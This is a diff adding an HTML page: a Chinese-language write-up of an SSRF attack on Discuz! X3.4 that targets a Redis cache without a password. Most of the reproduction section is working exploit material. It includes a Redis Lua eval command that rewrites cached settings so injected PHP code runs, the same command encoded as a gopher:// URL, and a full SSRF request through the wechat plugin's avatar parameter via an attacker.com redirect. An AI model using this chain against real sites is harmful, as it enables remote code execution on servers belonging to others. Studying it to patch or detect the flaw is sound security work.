@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="discuz-x34-ssrf-攻击redis"><span class="csDE05BCC">Discuz! X3.4 ssrf </span><span class="csECDA2D3">攻击</span><span class="csDE05BCC">redis</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要得到</span><span class="cs8926E06">authkey</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Discuz x3.4</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">类似地，</span><span class="cs8926E06">Dz </span><span class="cs9C1B1871">整合</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">配置成功后，默认情况下网站首页右下角会出现</span><span class="cs9FB05234">Redis On</span><span class="cs9C1B1871">的标志：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20ssrf%20%e6%94%bb%e5%87%bbredis_files/image0.jpg" width="560" height="80" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">SSRF </span><span class="cs9C1B1871">攻击</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">步骤实际上就比攻击</span><span class="cs8926E06"> Memcache </span><span class="cs9C1B1871">简单了，因为</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">支持</span><span class="cs8926E06"> lua </span><span class="cs9C1B1871">脚本，可以直接用</span><span class="cs8926E06"> lua </span><span class="cs9C1B1871">脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是</span><span class="cs8926E06"> Redis </span><span class="cs9C1B1871">没有配置密码认证，</span><span class="cs8926E06">Discuz requirepass </span><span class="cs9C1B1871">那一项为空：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20ssrf%20%e6%94%bb%e5%87%bbredis_files/image1.jpg" width="560" height="170" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Redis </span><span class="cs9C1B1871">交互命令行执行</span><span class="cs8926E06"> lua </span><span class="cs9C1B1871">脚本：</span></p><p class="cs3A447A38"><span class="cs9FB05234">eval &quot;local t=redis.call(&#39;keys&#39;,&#39;*_setting&#39;); for i,v in ipairs(t) do redis.call(&#39;set&#39;, v, &#39;a:2:{s:6:\&quot;output\&quot;;a:1:{s:4:\&quot;preg\&quot;;a:2:{s:6:\&quot;search\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:4:\&quot;/.*/\&quot;;}s:7:\&quot;replace\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:9:\&quot;phpinfo()\&quot;;}}}s:13:\&quot;rewritestatus\&quot;;i:1;}&#39;) end; return 1;&quot; 0</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20ssrf%20%e6%94%bb%e5%87%bbredis_files/image2.jpg" width="560" height="70" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同样地，对这个过程抓包，将数据包改成</span><span class="cs8926E06"> gopher </span><span class="cs9C1B1871">的形式：</span></p><p class="cs3A447A38"><span class="cs9FB05234">gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call(&#39;keys&#39;%2C&#39;*_setting&#39;)%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call(&#39;set&#39;%2C%20v%2C%20&#39;a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&#39;)%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a</span></p><p class="cs40DD2BC9"><span class="cs8926E06">SSRF </span><span class="cs9C1B1871">利用：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&amp;wxopenid=xxxyyyzzz</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">代码即再次执行成功。</span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://zhuanlan.zhihu.com/p/51907363</span></p></body>
+</html>
